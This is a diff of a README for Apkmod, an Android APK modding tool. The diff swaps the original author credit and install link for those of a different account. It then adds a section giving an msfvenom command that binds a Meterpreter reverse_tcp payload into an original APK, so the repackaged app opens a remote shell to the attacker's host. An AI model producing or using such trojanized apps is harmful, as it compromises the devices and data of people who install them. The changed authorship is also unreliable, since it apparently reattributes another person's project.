@@ -1,11 +1,12 @@
 # Apkmod v2.2
-### Author : Lokesh @Hax4us
+### Author : @mrjarvisofficial
 
 ## _Steps For Installation_
 1. First goto home directory `cd $HOME`
-2. Get the setup script `wget https://raw.githubusercontent.com/Hax4us/Apkmod/master/setup.sh`
-3. Execute the script `sh setup.sh`
-4. Now you can execute command `apkmod`
+2.Get git cloner by `apt install git`
+3. Get the setup script `git clone https://github.com/mrjarvisofficial/Apkmod`
+4. Execute the script `sh setup.sh`
+5. Now you can execute command `apkmod`
 
 ## Usage :
 1. For decompiling `apkmod -d /path/to/inapp.apk -o /path/to/outdirectory`. It will decompile __inapp.apk__ into __outdirectory__ folder.
@@ -26,5 +27,10 @@ after installation | Around 100 MB | Around 700-900 MB
 #### Why Apkmod is extremely small ?
 Because it has Alpine instead of Ubuntu, kali, parrot or other glibc based distros.
 
-#### You can join me on telegram also 
-https://t.me/joinchat/F1x4pElUinv6KLDTREJhZg
+##### Binding payload to original APKs
+1.Move original apk to your Internal Storage
+2.Then use this command
+###### Command
+```
+msfvenom -x /sdcard/(Name of the original apk).apk -p android/meterpreter/reverse_tcp LHOST=(Your IP)  LPORT=4444 -o /sdcard/test1.apk
+```
